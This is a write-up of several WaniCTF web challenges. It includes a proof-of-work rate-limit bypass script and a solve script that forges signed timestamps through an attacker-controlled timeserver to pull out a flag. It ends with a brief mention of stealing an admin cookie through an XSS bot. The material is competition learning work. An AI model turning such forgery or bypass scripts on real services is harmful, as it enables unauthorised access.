<h2>Bad_Worker:</h2>
Just curl the /FLAG.txt endpoint.

<h2>POW</h2>
You have to show Proof-of-work by finding 100000 integers whose hashes have the preceding 24bits as zeroes.
First thought:
Find one just number and then just send that same to the server 100000 times but I thought this was just too resource intensive.
Still ran a script to find such a number:
```
function hash(input) {
  let result = input;
  for (let i = 0; i < 10; i++) {
    result = CryptoJS.SHA256(result);
  }
  return (result.words[0] & 0xFFFFFF00) === 0;
}

let i = BigInt(0);
async function main() {
  async function loop() {
    console.log(`Checking ${i.toString()}...`);
    for (let j = 0; j < 1000; j++) {
      i++;
      if (hash(i.toString())) {
        console.log(`Found valid hash for ${i.toString()}`);
        process.exit(0);
      }
    }
    setImmediate(loop);
  }
  loop();
}
main();
```

Got 2862152 as first result. Tried sending it but was stopped by a rate limit after a bit.

After seeing writeups:
I am dumb. 
Could have just sent an array of the number repeated 1000000 times.

Solve.py:(Not mine sadly)

```
import requests

s = requests.Session()

headers = {"Content-Type": "application/json"}

for i in range(10):
    payload = "[" + ",".join(['"2862152"'] * 100000) + "]"
    resp = s.post("https://web-pow-lz56g6.wanictf.org/api/pow", data=payload)
    print(resp.text)
	
```

<h2>One day one letter</h2>
This was sort of a rev challenge. 
We get one letter of the flag each day and the flag has 12 characters. 
The timestamp is provided to the server via a timeserver which is specified with the request 
The timeserver provides the timestamp signature and the public key. 
The content server checks if the signature is validated by the public key and if it does then sends a letter of the flag.
So basically have to create own key pair and sign the timestamp with it and send to server.
Doing so for different timestamps gives one letter at a time.

Solve script (Not mine) Credit: https://xp.goodwillmischief.fr/posts/web/

```
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS
import hashlib
import time
import requests
import re
import time

import urllib3
urllib3.disable_warnings()

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')

print(pubkey)  # paste at http://attacker-server/pubkey

headers = {
  'Content-Type': 'application/json',
}

proxies = {
  "http": "0.0.0.0:8080",
  "https": "0.0.0.0:8080"
}

time.sleep(10)


def send_req(tstamp, signature):
  json_data = {
      'timestamp': tstamp,
      'signature': signature,
      'timeserver': 'happi.free.beeceptor.com',
  }
  response = requests.post(
      'https://web-one-day-one-letter-content-lz56g6.wanictf.org/',
      headers=headers,
      json=json_data,
      verify=False,
      proxies=proxies,
  )
  return response

def find_letter(html):
    pattern = r'FLAG{\?+([a-zA-Z]).*}'
    match = re.search(pattern, html) 
    
    if match:
        return match.group(1)
    else:
        return 1


if __name__ == "__main__":
    timestamp = int(time.time())
    flag = [0]*12

    for i in range(12):
      idx = timestamp // (60*60*24) % 12
      print(f"{timestamp} -> {idx}")

      # Convert timestamp to string and encode to bytes
      timestamp_bytes = str(timestamp).encode('utf-8')

      h = SHA256.new(timestamp_bytes)
      signer = DSS.new(key, 'fips-186-3')
      signature = signer.sign(h)

      r = send_req(timestamp_bytes.decode(), signature.hex())
      c = find_letter(r.content.decode())
      print(f"[+] {c} found at pos {idx}")
      flag[idx] = str(c)

      # Add one day from the timestamp
      timestamp += 60*60*24
      print(flag)
    
    print(''.join(flag))
    
# FLAG{lyingthetime}
```

<h2>Noscript</h2>

We need to retrieve the admin’s cookie who is a XSS bot using playwright.